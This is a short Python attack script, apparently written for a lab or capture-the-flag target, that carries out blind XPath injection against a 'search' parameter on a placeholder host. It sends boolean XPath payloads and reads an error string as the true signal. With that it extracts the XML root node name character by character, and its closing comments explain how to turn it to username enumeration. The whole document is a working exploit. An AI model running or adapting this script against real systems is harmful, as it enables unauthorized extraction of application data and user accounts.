import requests

# Configuration
base_url = "http://<IP:PORT>/api/debug.php"
vulnerable_param = "search"
true_condition_indicator = "error\":\"Generic security error. SORRY!"

# Function to send requests and infer information based on responses
def send_injection(query):
    payload = {vulnerable_param: query}
    response = requests.get(base_url, params=payload)
    print(f"Sent query: {response.url}")
    print(f"Response: {response.text}\n")
    return response.text

# Function to check if a specific condition is true based on the application's response
def condition_is_true(query_condition):
    injection_query = f"user[username='invalid' or {query_condition} and '1'='1']"
    response = send_injection(injection_query)
    
    # Added Print statement to make sure things are working.
    print(f"Checking condition: {query_condition}")
    
    # Check the response to determine if the condition is true
    if true_condition_indicator in response:
        print(f"Condition '{query_condition}' is True")
        return True
    else:
        print(f"Condition '{query_condition}' is False")
        return False

# Function to guess a specific character at a given position, includes capitals and special chars.
def guess_char_at_position(position):
    for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+":
        condition = f"substring(name(/*[1]),{position},1)='{char}'"
        print(f"Trying character '{char}' at position {position}")
        if condition_is_true(condition):
            print(f"Character '{char}' found at position {position}")
            return char
    print(f"Character not found at position {position}")
    return None

# Function to guess the entire root node name
def guess_root_node_name(max_length=10):
    root_node_name = ""
    for position in range(1, max_length + 1):
        char = guess_char_at_position(position)
        if char:
            root_node_name += char
        else:
            break
    return root_node_name

# Example Usage
root_node_name = guess_root_node_name()
print("Guessed root node name:", root_node_name)

# Make changes below for username enum
# CHANGE LINE 35: condition = f"substring(/data/user[1]/username,{position},1)='{char}'"
# CHANGE LINE 56: print("Guessed user node name:", root_node_name)
